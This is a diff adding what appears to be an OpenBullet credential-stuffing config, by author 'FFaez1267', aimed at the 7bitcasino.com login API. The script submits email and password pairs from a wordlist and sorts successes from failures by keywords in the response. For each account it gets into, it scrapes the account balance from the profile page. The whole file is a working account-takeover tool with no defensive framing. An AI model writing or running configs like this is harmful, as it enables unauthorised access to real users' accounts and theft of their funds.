@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "7bitcasino",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-22T02:02:59.6017067-05:00",
+  "AdditionalInfo": "",
+  "Author": "FFaez1267",
+  "Version": "1.0.2",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.7bitcasino.com/api/users/sign_in" 
+  CONTENT "{\"user\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"}}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/vnd.softswiss.v1+json" 
+  HEADER "referer: https://7bitcasino.com" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "getParameterByName" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email or password.\"}}}" 
+
+REQUEST GET "https://www.7bitcasino.com/profile" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "toggle\" href=\"#accounts\">" "<i class=\"fa fa-caret-down\"></i>" -> CAP "Balance" 
+
